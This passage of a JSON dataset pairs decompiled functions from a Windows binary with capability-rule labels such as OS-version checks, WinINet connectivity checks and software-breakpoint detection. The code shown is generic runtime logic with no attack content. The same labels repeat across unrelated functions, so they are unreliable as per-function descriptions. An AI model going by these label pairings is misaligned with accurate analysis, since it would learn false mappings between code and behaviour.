            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004080d5(int32_t param_1, uint32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint32_t in_EAX;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    \n    if (*(param_1 + 0x18) == '\\0') {\n        iVar1 = *(*(param_1 + 0x10) + 8);\n        in_EAX = *param_2;\n        if (in_EAX <= *(param_1 + 0xc) + -1 + iVar1) {\n            in_EAX = in_EAX - iVar1;\n            *param_2 = in_EAX;\ncode_r0x00408121:\n            return CONCAT31(in_EAX >> 8, 1);\n        }\n    }\n    else {\n        uVar3 = 0;\n        if (*(param_1 + 0xc) != 0) {\n            puVar2 = *(param_1 + 0x10) + 8;\n            in_EAX = *param_2;\n            do {\n                if (*puVar2 == in_EAX) {\n                    *param_2 = uVar3;\n                    goto code_r0x00408121;\n                }\n                uVar3 = uVar3 + 1;\n                puVar2 = puVar2 + 0xc;\n            } while (uVar3 < *(param_1 + 0xc));\n        }\n    }\n    return in_EAX & 0xffffff00;\n}\n",
        "token_count": 332
    },
    "00408377": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_140h\n\nuint __cdecl fcn.00408377(uint arg_8h, uint arg_ch)\n\n{\n    ulong uVar1;\n    uchar uVar2;\n    uint16_t uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    double dVar6;\n    code *pcVar7;\n    char cVar8;\n    ulong *puVar9;\n    uint *puVar10;\n    uint uVar11;\n    uint16_t *puVar12;\n    uchar *puVar13;\n    int32_t iVar14;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_140h;\n    uint var_130h;\n    uint var_120h;\n    uint var_110h;\n    uint var_100h;\n    uint var_f0h;\n    uint var_e0h;\n    uint var_d4h;\n    uint var_c4h;\n    uint var_b4h;\n    uint var_ach;\n    uint var_a4h;\n    uint var_94h;\n    uint var_84h;\n    uint var_74h;\n    uint var_64h;\n    uint var_54h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint pvargDest;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x3c) = 0;\n    fcn.0040abd5(unaff_EBP + -0x1c);\n    uVar11 = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -4) = 0;\n    fcn.00408af3(uVar11, unaff_EBP + -0x3c);\n    if (*(unaff_EBP + -0x3c) != 3) {\n        iVar14 = *(extraout_ECX + 0x54);\n        *(unaff_EBP + 0xc) = uVar11;\n        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n        pcVar7 = _sym.imp.OLEAUT32.dll_VariantCopy;\n        if (cVar8 != '\\0') {\n            uVar3 = *(*(iVar14 + 0x10) + 0x14 + *(unaff_EBP + 0xc) * 0x30);\n            if (uVar3 < 0x82) {\n                if (uVar3 == 0x81) {\n                    iVar14 = *(extraout_ECX + 0x54);\n                    *(unaff_EBP + 0xc) = uVar11;\n                    cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                    if (cVar8 == '\\0') {\n                        iVar14 = 0;\n                    }\n                    else {\n                        iVar14 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                    }\n                    puVar10 = fcn.0041d2e7(iVar14);\n                    uVar11 = *puVar10;\n                    *(unaff_EBP + -4) = 2;\n                    uVar11 = fcn.0040aa9d(uVar11, 8);\n                    *(unaff_EBP + -4) = 3;\n                    fcn.0040abbb(uVar11);\n                    (*pcVar7)(unaff_EBP + -0x120);\n                    *(unaff_EBP + -4) = 0;\n                    goto code_r0x00408ac8;\n                }\n                if (uVar3 < 9) {\n                    if (uVar3 == 8) goto code_r0x00408a62;\n                    if (uVar3 == 2) {\ncode_r0x00408647:\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar12 = NULL;\n                        }\n                        else {\n                            puVar12 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar11 = fcn.0040ab18(puVar12 & 0xffff0000 | *puVar12, 2);\n                        *(unaff_EBP + -4) = 7;\n                        fcn.0040abbb(uVar11);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0x110;\n                    }\n                    else if (uVar3 == 3) {\ncode_r0x004085f0:\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar10 = NULL;\n                        }\n                        else {\n                            puVar10 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar11 = fcn.0040ab4e(*puVar10, 3);\n                        *(unaff_EBP + -4) = 8;\n                        fcn.0040abbb(uVar11);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0xf0;\n                    }\n                    else if (uVar3 == 4) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar10 = NULL;\n                        }\n                        else {\n                            puVar10 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar11 = *puVar10;\n                        *(unaff_EBP + -100) = 4;\n                        *(unaff_EBP + -0x5c) = uVar11;\n                        *(unaff_EBP + -4) = 9;\n                        fcn.0040abbb(unaff_EBP + -100);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -100;\n                    }\n                    else if (uVar3 == 5) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar9 = NULL;\n                        }\n                        else {\n                            puVar9 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar1 = *puVar9;\n                        *(unaff_EBP + -0x94) = 5;\n                        *(unaff_EBP + -0x8c) = uVar1;\n                        *(unaff_EBP + -4) = 10;\n                        fcn.0040abbb(unaff_EBP + -0x94);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0x94;\n                    }\n                    else if (uVar3 == 6) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar10 = NULL;\n                        }\n                        else {\n                            puVar10 = *(*(iVar14 + 0x10) + 4 + *(unaff_EBP + 0xc) * 0x30) + *(iVar14 + 8);\n                        }\n                        uVar11 = *puVar10;\n                        uVar4 = puVar10[1];\n                        *(unaff_EBP + -0x54) = 6;\n                        *(unaff_EBP + -0x4c) = uVar11;\n                        *(unaff_EBP + -0x48) = uVar4;\n                        *(unaff_EBP + -4) = 0xd;\n                        fcn.0040abbb(unaff_EBP + -0x54);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0x54;\n                    }\n                    else {\n                        if (uVar3 != 7) goto code_r0x00408acd;\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar9 = NULL;\n                        }\n                        else {\n                            puVar9 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar1 = *puVar9;\n                        *(unaff_EBP + -0xc4) = 7;\n                        *(unaff_EBP + -0xbc) = uVar1;\n                        *(unaff_EBP + -4) = 0xc;\n                        fcn.0040abbb(unaff_EBP + -0xc4);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0xc4;\n                    }\ncode_r0x004088cf:\n                    (*pcVar7)(iVar14);\n                }\n                else {\n                    if (uVar3 == 0xb) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            puVar12 = NULL;\n                        }\n                        else {\n                            puVar12 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar11 = fcn.0040ab18(puVar12 & 0xffff0000 | *puVar12, 0xb);\n                        *(unaff_EBP + -4) = 0xb;\n                        fcn.0040abbb(uVar11);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0x100;\n                        goto code_r0x004088cf;\n                    }\n                    if (uVar3 == 0xc) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 == '\\0') {\n                            iVar14 = 0;\n                        }\n                        else {\n                            iVar14 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                        }\n                        uVar11 = fcn.0040aa7d(iVar14);\n                        *(unaff_EBP + -4) = 1;\n                        fcn.0040abbb(uVar11);\n                        *(unaff_EBP + -4) = 0;\n                        iVar14 = unaff_EBP + -0x130;\n                        goto code_r0x004088cf;\n                    }\n                    if (0xf < uVar3) {\n                        if (uVar3 < 0x12) {\n                            iVar14 = *(extraout_ECX + 0x54);\n                            *(unaff_EBP + 0xc) = uVar11;\n                            cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                            if (cVar8 == '\\0') {\n                                puVar13 = NULL;\n                            }\n                            else {\n                                puVar13 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                            }\n                            uVar2 = *puVar13;\n                            *(unaff_EBP + -0xb4) = 0x11;\n                            *(unaff_EBP + -0xac) = uVar2;\n                            *(unaff_EBP + -4) = 6;\n                            fcn.0040abbb(unaff_EBP + -0xb4);\n                            *(unaff_EBP + -4) = 0;\n                            iVar14 = unaff_EBP + -0xb4;\n                            goto code_r0x004088cf;\n                        }\n                        if (uVar3 == 0x12) goto code_r0x00408647;\n                        if (uVar3 == 0x13) goto code_r0x004085f0;\n                    }\n                }\n            }\n            else {\n                if (uVar3 != 0x82) {\n                    if (uVar3 == 0x83) {\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 != '\\0') {\n                            puVar10 = fcn.00408b37(*(unaff_EBP + 0xc));\n                            *(unaff_EBP + -0x38) = *puVar10;\n                            *(unaff_EBP + -0x34) = puVar10[1];\n                            *(unaff_EBP + -0x30) = puVar10[2];\n                            *(unaff_EBP + -0x2c) = puVar10[3];\n                            *(unaff_EBP + -0x28) = *(puVar10 + 4);\n                            *(unaff_EBP + -0x26) = *(puVar10 + 0x12);\n                            dVar6 = *(unaff_EBP + -0x35);\n                            cVar8 = *(unaff_EBP + -0x37);\n                            while (cVar8 != '\\0') {\n                                dVar6 = dVar6 * *0x42b110;\n                                cVar8 = cVar8 + -1;\n                            }\n                            if (*(unaff_EBP + -0x36) == '\\0') {\n                                dVar6 = -dVar6;\n                            }\n                            *(unaff_EBP + -0x7c) = dVar6;\n                            *(unaff_EBP + -0x84) = 5;\n                            *(unaff_EBP + -4) = 0xe;\n                            fcn.0040abbb(unaff_EBP + -0x84);\n                            *(unaff_EBP + -4) = 0;\n                            iVar14 = unaff_EBP + -0x84;\n                            goto code_r0x004088cf;\n                        }\n                    }\n                    else if (uVar3 == 0x85) {\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 != '\\0') {\n                            puVar10 = fcn.00408b37(*(unaff_EBP + 0xc));\n                            *(unaff_EBP + -0x24) = *puVar10;\n                            *(unaff_EBP + -0x34) = 0;\n                            *(unaff_EBP + -0x20) = *(puVar10 + 1);\n                            *(unaff_EBP + -0x2c) = 0;\n                            fcn.0040ad25(*(unaff_EBP + -0x24), *(unaff_EBP + -0x22), *(unaff_EBP + -0x20), 0, 0, 0);\n                            *(unaff_EBP + -0x74) = 7;\n                            *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x34);\n                            *(unaff_EBP + -4) = 0xf;\n                            fcn.0040abbb(unaff_EBP + -0x74);\n                            *(unaff_EBP + -4) = 0;\n                            iVar14 = unaff_EBP + -0x74;\n                            goto code_r0x004088cf;\n                        }\n                    }\n                    else if (uVar3 == 0x86) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 != '\\0') {\n                            iVar5 = *(iVar14 + 0x10);\n                            *(unaff_EBP + -0x2c) = 0;\n                            puVar10 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + iVar5) + *(iVar14 + 8);\n                            *(unaff_EBP + -0x34) = 0;\n                            *(unaff_EBP + -0x24) = *puVar10;\n                            *(unaff_EBP + -0x20) = *(puVar10 + 1);\n                            fcn.0040ad25(0x76b, 0xc, 0x1e, *(unaff_EBP + -0x24), *(unaff_EBP + -0x22), \n                                         *(unaff_EBP + -0x20));\n                            *(unaff_EBP + -0xa4) = 7;\n                            *(unaff_EBP + -0x9c) = *(unaff_EBP + -0x34);\n                            *(unaff_EBP + -4) = 0x10;\n                            fcn.0040abbb(unaff_EBP + -0xa4);\n                            *(unaff_EBP + -4) = 0;\n                            iVar14 = unaff_EBP + -0xa4;\n                            goto code_r0x004088cf;\n                        }\n                    }\n                    else if (uVar3 == 0x87) {\n                        iVar14 = *(extraout_ECX + 0x54);\n                        *(unaff_EBP + 0xc) = uVar11;\n                        cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                        if (cVar8 != '\\0') {\n                            puVar10 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                            *(unaff_EBP + -0x38) = *puVar10;\n                            *(unaff_EBP + -0x34) = puVar10[1];\n                            *(unaff_EBP + -0x30) = puVar10[2];\n                            *(unaff_EBP + -0x2c) = puVar10[3];\n                            fcn.0040ad25(*(unaff_EBP + -0x38), *(unaff_EBP + -0x36), *(unaff_EBP + -0x34), \n                                         *(unaff_EBP + -0x32), *(unaff_EBP + -0x30), *(unaff_EBP + -0x2e));\n                            *(unaff_EBP + -0xd4) = 7;\n                            *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xe0);\n                            *(unaff_EBP + -4) = 0x11;\n                            fcn.0040abbb(unaff_EBP + -0xd4);\n                            *(unaff_EBP + -4) = 0;\n                            iVar14 = unaff_EBP + -0xd4;\n                            goto code_r0x004088cf;\n                        }\n                    }\n                    goto code_r0x00408acd;\n                }\ncode_r0x00408a62:\n                iVar14 = *(extraout_ECX + 0x54);\n                *(unaff_EBP + 0xc) = uVar11;\n                cVar8 = fcn.004080d5(unaff_EBP + 0xc);\n                if (cVar8 == '\\0') {\n                    iVar14 = 0;\n                }\n                else {\n                    iVar14 = *(*(unaff_EBP + 0xc) * 0x30 + 4 + *(iVar14 + 0x10)) + *(iVar14 + 8);\n                }\n                puVar10 = fcn.0041d339(iVar14);\n                uVar11 = *puVar10;\n                *(unaff_EBP + -4) = 4;\n                uVar11 = fcn.0040aa9d(uVar11, 8);\n                *(unaff_EBP + -4) = 5;\n                fcn.0040abbb(uVar11);\n                (*pcVar7)(unaff_EBP + -0x140);\n                *(unaff_EBP + -4) = 0;\ncode_r0x00408ac8:\n                fcn.0041d2bd();\n            }\ncode_r0x00408acd:\n            fcn.0040aa7d(unaff_EBP + -0x1c);\n            (*pcVar7)(unaff_EBP + -0x1c);\n            goto code_r0x00408adf;\n        }\n    }\n    fcn.0040aa7d(unaff_EBP + -0x1c);\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(unaff_EBP + -0x1c);\ncode_r0x00408adf:\n    uVar11 = *(unaff_EBP + 8);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar11;\n}\n",
        "token_count": 5033
    },
    "0040975f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0040975f(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *extraout_ECX;\n    uint unaff_EBX;\n    int32_t unaff_EBP;\n    uint unaff_ESI;\n    uint *in_FS_OFFSET;\n    uint *noname_1;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = 0;\n    noname_1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -4) = 0;\n    iVar2 = (***noname_1)();\n    if (iVar2 < 0) {\ncode_r0x004097a1:\n        piVar1 = *(unaff_EBP + -0x10);\n        *(unaff_EBP + -4) = 0xffffffff;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    else {\n        if (*extraout_ECX == 0) {\n            iVar2 = fcn.00407e08(1, noname_1, 0x449ed8, unaff_EBP + -0x10, unaff_ESI, unaff_EBX);\n            if (iVar2 < 0) goto code_r0x004097a1;\n            *(*extraout_ECX + 4) = 1;\n        }\n        iVar2 = fcn.00407e64(extraout_ECX[3], extraout_ECX[4], *extraout_ECX, extraout_ECX[6], *(unaff_EBP + -0x10));\n        *(unaff_EBP + -4) = 0xffffffff;\n        piVar1 = *(unaff_EBP + -0x10);\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 8))(piVar1);\n        }\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 521
    },
    "0040983e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040983e(int32_t **param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t **var_4h;\n    \n    if ((param_1[2] != 0x80010001) && (*param_1 != NULL)) {\n        puVar1 = (*param_1)[0x13];\n        var_4h = param_1;\n        iVar2 = (***puVar1)(puVar1, 0x42c8c0, &var_4h);\n        if (iVar2 < 0) {\n            iVar2 = fcn.004098c1();\n            if (iVar2 != 0) {\n                uVar3 = 0xd;\n                if (param_1[3][0x22] != 0) {\n                    uVar3 = 0x800d;\n                }\n                (**(**param_1 + 0x68))(*param_1, param_1[2], uVar3, iVar2);\n            }\n        }\n        else {\n            (*(*var_4h)[3])(var_4h, param_1[2], param_1[3] != NULL, param_1 + 4);\n            (*(*var_4h)[2])(var_4h);\n        }\n    }\n    return;\n}\n",
        "token_count": 299
    },
    "0040a41f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a41f(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    if (arg_10h == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = *(arg_10h + 0x1c);\n    }\n    iVar2 = (*_sym.imp.USER32.dll_IsChild)(*(arg_8h + 0x1c), uVar1);\n    if (iVar2 == 0) {\n        return;\n    }\n    if (arg_10h != 0) {\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(*(arg_10h + 0x1c), 0xffffffec);\n        if ((uVar3 & 0x10000) != 0) {\n            return;\n        }\n        var_4h = fcn.0040a36f(arg_10h);\n    }\n    if (arg_ch == arg_10h) {\n        if ((var_4h & 0x20) == 0) {\n            return;\n        }\n        if (arg_ch != 0) {\n            uVar1 = fcn.0040a3f2(arg_8h);\n            iVar2 = fcn.0040a2cb(arg_8h, uVar1);\n            if (((iVar2 != 0) && (iVar2 != arg_10h)) && (uVar3 = fcn.0040a36f(iVar2),  (uVar3 & 0x10) != 0))\n            goto code_r0x0040a4c5;\n        }\n    }\n    else {\n        if (((arg_ch != 0) && (iVar2 = fcn.0040a36f(arg_ch),  iVar2 != 0)) || ((arg_10h != 0 && (var_4h != 0)))) {\ncode_r0x0040a4c5:\n            fcn.0040a390(arg_8h);\n        }\n        if ((var_4h & 0x30) == 0) {\n            iVar2 = arg_8h;\n            uVar1 = fcn.0040a3f2(arg_8h);\n            arg_10h = fcn.0040a2cb(arg_8h, uVar1);\n            uVar3 = fcn.0040a36f(arg_10h);\n            if ((uVar3 & 0x20) == 0) {\n                return;\n            }\n            iVar4 = fcn.00420478();\n            if (iVar4 == 0) {\n                return;\n            }\n            goto code_r0x0040a4fe;\n        }\n    }\n    iVar2 = 1;\ncode_r0x0040a4fe:\n    fcn.0040a322(arg_10h, iVar2);\n    return;\n}\n",
        "token_count": 684
    },
    "0040a9a3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t * fcn.0040a9a3(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *extraout_ECX;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = &var_14h;\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(extraout_ECX + 4);\n    if (extraout_ECX[3] == 0) {\n        iVar3 = *extraout_ECX;\n        *(unaff_EBP + -4) = 0;\n        iVar1 = fcn.0041b7fa(extraout_ECX + 2, extraout_ECX[1], iVar3);\n        iVar3 = extraout_ECX[1];\n        piVar2 = (iVar3 + -1) * *extraout_ECX + 4 + iVar1;\n        if (-1 < iVar3 + -1) {\n            do {\n                *piVar2 = extraout_ECX[3];\n                extraout_ECX[3] = piVar2;\n                piVar2 = piVar2 - *extraout_ECX;\n                iVar3 = iVar3 + -1;\n            } while (iVar3 != 0);\n        }\n    }\n    piVar2 = extraout_ECX[3];\n    extraout_ECX[3] = *piVar2;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(extraout_ECX + 4);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return piVar2;\n}\n",
        "token_count": 446
    },
    "0040ab18": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0040ab18(ushort *param_1, int16_t param_2, int16_t param_3)\n\n{\n    if (param_3 == 0xb) {\n        *param_1 = 0xb;\n        if (param_2 == 0) {\n            param_1[4] = 0;\n        }\n        else {\n            param_1[4] = 0xffff;\n        }\n    }\n    else {\n        *param_1 = 2;\n        param_1[4] = param_2;\n    }\n    return;\n}\n",
        "token_count": 129
    },
    "0040ab4e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ab4e(int32_t arg_8h, uint arg_ch)\n\n{\n    ushort *in_ECX;\n    \n    if (arg_ch == 10) {\n        *in_ECX = 10;\n    }\n    else {\n        if (arg_ch == 0xb) {\n            *in_ECX = 0xb;\n            if (arg_8h == 0) {\n                in_ECX[4] = 0;\n                return;\n            }\n            in_ECX[4] = 0xffff;\n            return;\n        }\n        *in_ECX = 3;\n    }\n    *(in_ECX + 4) = arg_8h;\n    return;\n}\n",
        "token_count": 153
    },
    "0040b222": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0040b222(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    int32_t iStack16;\n    \n    iStack16 = param_1;\n    uStack24 = 0x40b200;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    while( true ) {\n        iVar1 = *(param_1 + 8);\n        iVar2 = *(param_1 + 0xc);\n        if ((iVar2 == -1) || (iVar2 == param_2)) break;\n        uStack20 = *(iVar1 + iVar2 * 0xc);\n        *(param_1 + 0xc) = uStack20;\n        if (*(iVar1 + 4 + iVar2 * 0xc) == 0) {\n            fcn.0040b2b6(0x101);\n            (**(iVar1 + 8 + iVar2 * 0xc))();\n        }\n    }\n    *in_FS_OFFSET = uStack28;\n    return;\n}\n",
        "token_count": 267
    },
    "0040cb71": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040cb71(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    if (arg_8h == 0) {\n        iVar1 = fcn.0040ae6e(arg_ch);\n    }\n    else {\n        if (arg_ch == 0) {\n            fcn.0040b942(arg_8h);\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_ch < 0xffffffe1) {\n                    fcn.0040d20a(9);\n                    arg_8h_00 = fcn.0040d2be(arg_8h);\n                    if (arg_8h_00 == 0) {\n                        fcn.0040d26b(9);\n                        if (arg_ch == 0) {\n                            arg_ch = 1;\n                        }\n                        arg_ch = arg_ch + 0xf & 0xfffffff0;\n                        iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x44f15c, 0, arg_8h, arg_ch);\n                    }\n                    else {\n                        if (*0x44a5f4 < arg_ch) {\ncode_r0x0040cc10:\n                            if (arg_ch == 0) {\n                                arg_ch = 1;\n                            }\n                            arg_ch = arg_ch + 0xf & 0xfffffff0;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44f15c, 0, arg_ch);\n                            if (iVar1 != 0) {\n                                uVar3 = *(arg_8h + -4) - 1;\n                                if (arg_ch <= uVar3) {\n                                    uVar3 = arg_ch;\n                                }\n                                fcn.0040bb50(iVar1, arg_8h, uVar3);\n                                fcn.0040d2e9(arg_8h_00, arg_8h);\n                            }\n                        }\n                        else {\n                            iVar2 = fcn.0040dac9(arg_8h_00, arg_8h, arg_ch);\n                            iVar1 = arg_8h;\n                            if (iVar2 == 0) {\n                                iVar1 = fcn.0040d614(arg_ch);\n                                if (iVar1 == 0) goto code_r0x0040cc10;\n                                uVar3 = *(arg_8h + -4) - 1;\n                                if (arg_ch <= uVar3) {\n                                    uVar3 = arg_ch;\n                                }\n                                fcn.0040bb50(iVar1, arg_8h, uVar3);\n                                fcn.0040d2e9(arg_8h_00, arg_8h);\n                            }\n                            if (iVar1 == 0) goto code_r0x0040cc10;\n                        }\n                        fcn.0040d26b(9);\n                    }\n                    if (iVar1 != 0) {\n                        return iVar1;\n                    }\n                }\n                if (*0x44d874 == 0) {\n                    return iVar1;\n                }\n                iVar1 = fcn.0040d18a(arg_ch);\n            } while (iVar1 != 0);\n        }\n        iVar1 = 0;\n    }\n    return iVar1;\n}\n",
        "token_count": 746
    },
    "0040e310": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
